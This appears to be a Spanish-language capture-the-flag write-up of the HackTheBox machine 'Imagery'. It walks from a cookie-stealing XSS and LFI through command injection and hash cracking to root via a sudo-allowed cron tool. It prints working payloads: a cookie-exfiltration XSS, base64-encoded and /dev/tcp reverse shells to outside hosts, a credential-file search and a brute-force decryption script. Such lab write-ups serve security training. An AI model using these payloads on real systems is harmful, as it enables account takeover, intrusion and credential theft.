---
title: "Imagery" 
platform: "Hackthebox"
date: "2026-02-27" 
difficulty: "Medium" 
os: "Linux" 
description: "Resolución de la máquina Analysis de HackTheBox." 
---

#Medium #XSS #linux #LFI  

-------------

Empezamos con el escaneo de la maquina para ver los puertos que tiene abiertos con nmap:

![[Pasted image 20260112195654.png]]

Vamos a ver que información podemos sacar de los puertos que tenemos abiertos:
![[Pasted image 20260112200522.png]]

Accedemos a la web: 

![[Pasted image 20260112200806.png]]

Nos hemos registrado por lo que vemos podemos subir imagenes, ya que es una web en la que podemos almacenar imagenes que subamos. Vamos hacer un analisis de directorios que alomejor no podemos ver:

![[Pasted image 20260112202339.png]]


Vamos a revisar los diferentes directorios que tenemos, pero no hemos encontrado nada en ellos ya que no cargan por lo que vamos a seguir explorando, a la hora de subir archivos no parece que haya ningún XSS, por lo que explorando en el footer de la pagina hay un reporte de bugs por si encuentras alguno intuimos hacérselo llegar a los admins de la pagina:
![[Pasted image 20260112204512.png]]

Por lo que vamos a probar con este formulario haber si conseguimos tener mas suerte.

Hemos probado a robar la cookie de sesion del admin inyectadno en el formulario la siguiente etiqueta: 

`img src=x onerror="document.location='http://10.10.15.121/?cookie='+document.cookie"`


Efectivamente nos entra una conexion y nos deja la cookie de sesion del admin:

![[Pasted image 20260112205524.png]]
Cargamos la cookie que nos llega y nos aparece un admin panel:
![[Pasted image 20260112205711.png]]

Teniendo control de la cuenta del admin tenemos que investigar que podemos hacer desde aqui.

Entramos en el panel del login en donde podemos descargarnos los logs de acceso de cada usuario vamos a interceptar esta petición: 
![[Pasted image 20260119165439.png]]

Ahora vamos a probar un #LFI, haber si podemos acceder a otros archivos que tenga el sistema, efectivamente podemos acceder a otros archivos como el /etc/passwd:

![[Pasted image 20260119165640.png]]
Por lo que vamos a intentar acceder a algún fichero de configuración en busca de contraseñas.

estamos como el usuario web: ![[Pasted image 20260119165815.png]]

Por lo que parece estamos en un servidor levantado con flask de python. Claude no da algunos ficheros de configuración que podemos buscar como este: 
![[Pasted image 20260119170026.png]]

En el que vemos hashes de usuarios que existen en la web.
Vamos a intentar crackear los hashes que tenemos, conseguimos crackear el del testuser contraseña iambatman.
Cuando accedemos con este usuario vemos que este si tiene permisos para transformar imagenes y tiene desbloqueado lo que nuestro usuario si que tenia bloqueado, por lo que vamos a interceptar estas peticiones.

En una de las peticiones de transformación en la que se necesita x e y encontramos lo siguiente: ![[Pasted image 20260119170817.png]]

Por lo que hemos encontrado un RCE #RemoteCodeExecution

![[Pasted image 20260119173925.png]]
Y nos conectamos a la maquina con el siguiente payload: 
1; echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL2Jhc2ggLWkgMj4mMXxuYyAxMC4xMC4xNC43MyA5MDkxID4vdG1wL2Y= | base64 -d | bash; #"

Porl lo que ahora tendremos que hacer una escalada de privilegios.
encontramos un archivo con la password del admin:
![[Pasted image 20260119174155.png]]

Nos la guardamos como informacion extraida del objetivo.
ejecutamos el siguiente comando para buscar archivos utiles:

``` bash
find / \( -iname "*id_rsa" -o -iname "*db" -o -iname "*sql" -o -iname "*key" -o -iname "*pem" -o -iname "*backup" -o -iname "*bak" -o -iname "*conf" \) 2>/dev/null
```

Encontramos la siguiente ruta:

/var/backup, donde encontramos el siguiente archivo:
![[Pasted image 20260119180725.png]]

Nos lo pasamos a la maquina local.
Y lo desciframos con el siguiente código en python ya que probando con el resto de passwords que hemos encontrado no nos dejaba:
``` python
import pyAesCrypt
import sys

def decrypt(encrypted_file, password):
    try:
        pyAesCrypt.decryptFile(
            encrypted_file,
            "web_20250806_120723.zip",
            password,
            256 * 1024
        )
        return True
    except:
        return False

# Đọc wordlist
with open('/usr/share/wordlists/rockyou.txt', 'r', encoding='latin-1') as f:
    for line in f:
        password = line.strip()
        print(f"Trying: {password}", end='\r')
        
        if decrypt('web_20250806_120723.zip.aes', password):
            print(f"\n[+] Password found: {password}")
            sys.exit(0)

print("\n[-] Password not found")

```

![[Pasted image 20260119180922.png]]

Con esto ya podemos desencriptar y descomprimir la carpeta.
encontramos un archivo llamado db.json con informacion de mas usuarios:

┌──(venv)─(root㉿kali)-[/home/…/Desktop/htb/Imagery/web]
└─# cat db.json   
```json{
    "users": [
        {
            "username": "admin@imagery.htb",
            "password": "5d9c1d507a3f76af1e5c97a3ad1eaa31",
            "displayId": "f8p10uw0",
            "isTestuser": false,
            "isAdmin": true,
            "failed_login_attempts": 0,
            "locked_until": null
        },
        {
            "username": "testuser@imagery.htb",
            "password": "2c65c8d7bfbca32a3ed42596192384f6",
            "displayId": "8utz23o5",
            "isTestuser": true,
            "isAdmin": false,
            "failed_login_attempts": 0,
            "locked_until": null
        },
        {
            "username": "mark@imagery.htb",
            "password": "01c3d2e5bdaf6134cec0a367cf53e535",
            "displayId": "868facaf",
            "isAdmin": false,
            "failed_login_attempts": 0,
            "locked_until": null,
            "isTestuser": false
        },
        {
            "username": "web@imagery.htb",
            "password": "84e3c804cf1fa14306f26f9f3da177e0",
            "displayId": "7be291d4",
            "isAdmin": true,
            "failed_login_attempts": 0,
            "locked_until": null,
            "isTestuser": false
        }
```
Con estos usuarios probamos a crackear las passwords con crackstation: 
![[Pasted image 20260119181604.png]]Hemos descifrado la contraseña del usuario mark, por lo que vamos a probar a conectarnos:
![[Pasted image 20260119181702.png]]

Como vemos hemos encontrado la flag del usuario.
Ahora si vamos a escalar privilegios.

ejecutamos el comando sudo -l:

![[Pasted image 20260119181836.png]]

Tiene todos los permisos ese programa llamado charcol.

Como tenemos permisos de root en la ejecucion de este binario lo primero que hacemos es resetar las password con el parametro -R: 

```bash
charcol -R
```

Cuando la hayamos reseteado accedemos a la herramienta si hacemos un help para ver que podemos hacer con ella vemos que podemos ejecutar cron con comando por lo que desde aqui como lo ejecuta root nos vamos a intentar mandar una reverse shell:

```bash
charcol> auto add --schedule "* * * * *" --command "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.197/443 0>&1'" --name "rev_toni" --log-output /home/mark/auto.log

```

Una vez ejecutado esto se añade el schedule al sistema y nos envia la conexion por donde estamos en escucha:

![[Pasted image 20260202170648.png]]